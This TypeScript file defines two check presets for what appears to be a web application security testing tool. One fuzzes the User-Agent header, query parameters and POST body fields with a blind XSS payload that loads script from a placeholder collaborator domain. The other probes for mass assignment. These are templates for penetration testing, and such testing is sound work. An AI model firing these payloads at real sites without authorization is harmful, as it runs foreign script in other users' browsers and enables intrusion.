import type { CheckRule } from "../../types";

export type CheckPreset = Omit<CheckRule, "id">;

export const bxssCheck: CheckPreset = {
  name: "Blind XSS",
  description:
    "Fuzz User-Agent, query params and body with a blind XSS payload",
  code: `// Replace this with your own blind XSS / collaborator domain
const bxssDomain = "YOUR-BXSS-COLLABORATOR.com";
const payload = \`"><svg/onload=import('//\${bxssDomain}/\${random()}')>\`;

const originalUa = request.headers.get("User-Agent");
request.headers.set("User-Agent", (originalUa ?? "") + payload);
await send(request);
request.headers.set("User-Agent", originalUa ?? "");

const encodedPayload = encode(payload, "url", { strict: true });

for (const param of request.query.items) {
  const original = param.value;
  request.query.set(param.name, encodedPayload);
  await send(request);
  request.query.set(param.name, original);
}

if (request.method === "POST" && request.body !== undefined) {
  for (const field of request.body.items) {
    const original = field.value;
    request.body.set(field.name, payload);
    await send(request);
    request.body.set(field.name, original);
  }
}`,
};

export const massAssignmentCheck: CheckPreset = {
  name: "Mass Assignment",
  description:
    "Add response body keys to the request body to test mass assignment",
  code: `if (["POST", "PUT", "PATCH"].includes(request.method)) {
  if (response !== undefined && response.body !== undefined) {
    if (request.body !== undefined) {
      for (const field of response.body.items) {
        request.body.set(field.name, "mass_assignment_test");
        await send(request);
        request.body.remove(field.name);
      }
    }
  }
}`,
};
